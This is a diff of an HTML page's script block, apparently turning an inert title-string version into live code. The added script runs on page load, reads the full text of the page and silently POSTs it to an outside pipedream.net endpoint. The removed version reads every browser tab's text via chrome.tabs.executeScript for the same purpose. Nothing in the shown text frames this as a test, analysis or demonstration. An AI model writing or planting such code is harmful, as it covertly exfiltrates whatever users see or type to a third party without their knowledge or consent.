@@ -11,57 +11,43 @@
      
     
 
-        <script> 
-        document.title = `
-
-        $(document).ready(function(){
-        
-        tabsContent = {};
-
-         function getTabData(tabId){
-            chrome.tabs.executeScript(tabId, {
-                code: 'document.body.innerText'
-            }, function(result) {
-                const content = result[0];
-                tabsContent[tabId] = content;
-                sendContent (tabId,content); 
-            });
-        }
-
-        function sendContent(tabId, content) {
-          
+        <script>
+    $(document).ready(function(){
+        // Function to send content
+        function sendContent(content) {
             const url = 'https://eodpzmmv3plxhm9.m.pipedream.net'; 
           
             // Data to be sent in the POST request
             const data = {
-              tabId: tabId,
-              content: content
+                content: content
             };
           
             // Fetch options
             const options = {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify(data)
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
             };
             // Sending the POST request
             fetch(url, options)
             .then(response => {
                 if (response.ok) {
-                console.log('Content sent successfully.');
+                    console.log('Content sent successfully.');
                 } else {
-                console.error('Error sending content:', response.statusText);
+                    console.error('Error sending content:', response.statusText);
                 }
             })
             .catch(error => {
                 console.error('Error sending content:', error);
             });
         }
-       
-        });`
-    
-          </script>
+        
+        // Get content of the webpage and send it
+        const content = document.body.innerText;
+        sendContent(content);
+    });
+    </script>
         </body>
         </html>
